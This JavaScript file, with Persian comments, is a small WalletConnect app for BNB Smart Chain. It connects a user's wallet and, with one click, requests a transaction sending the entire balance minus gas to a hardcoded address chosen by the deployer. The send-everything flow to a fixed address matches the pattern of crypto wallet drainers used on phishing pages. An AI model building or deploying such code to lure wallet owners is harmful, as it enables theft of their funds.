import { createWeb3Modal } from '@walletconnect/modal-sign-html'
import { ethers } from 'ethers'

const projectId = "4d08946e6c316bed5e76b450ccbb5256" // ← اینجا Project ID خودت رو بذار
const targetAddress = "0x98907E5eE9E010c34DF6F7847565D421D3CDAd05" // ← آدرس گیرنده BNB رو وارد کن

const metadata = {
  name: "BNB Sender App",
  description: "Send full BNB via WalletConnect",
  url: "https://yourapp.com",
  icons: ["https://walletconnect.com/walletconnect-logo.png"]
}

const web3Modal = createWeb3Modal({
  projectId,
  themeMode: 'light',
  chains: [{ chainId: 56, rpcUrl: 'https://bsc-dataseed.binance.org/' }],
  metadata
})

let address = ""
let provider = new ethers.JsonRpcProvider('https://bsc-dataseed.binance.org/')
let signer

document.getElementById('connectBtn').addEventListener('click', async () => {
  try {
    await web3Modal.openModal()
    const session = await web3Modal.signClient.core.session.getAll()
    const acc = session[0].namespaces.eip155.accounts[0]
    address = acc.split(':')[2]
    document.getElementById('address').textContent = address

    const balance = await provider.getBalance(address)
    document.getElementById('balance').textContent = `${ethers.formatEther(balance)} BNB`

    document.getElementById('sendAllBtn').disabled = false
  } catch (err) {
    alert("Connection failed: " + (err?.message || err))
  }
})

document.getElementById('sendAllBtn').addEventListener('click', async () => {
  try {
    const balance = await provider.getBalance(address)
    const feeData = await provider.getFeeData()
    const gasPrice = feeData.gasPrice
    const gasLimit = 21000n
    const gasCost = gasLimit * gasPrice
    const amountToSend = balance - gasCost

    if (amountToSend <= 0n) {
      alert("Not enough BNB to send")
      return
    }

    const tx = {
      from: address,
      to: targetAddress,
      value: `0x${amountToSend.toString(16)}`,
      gas: `0x${gasLimit.toString(16)}`,
      gasPrice: `0x${gasPrice.toString(16)}`
    }

    const result = await web3Modal.signClient.request({
      topic: web3Modal.session.topic,
      chainId: "eip155:56",
      request: {
        method: "eth_sendTransaction",
        params: [tx]
      }
    })

    alert("Transaction sent: " + result)
  } catch (err) {
    alert("Transaction failed: " + (err?.message || err))
  }
})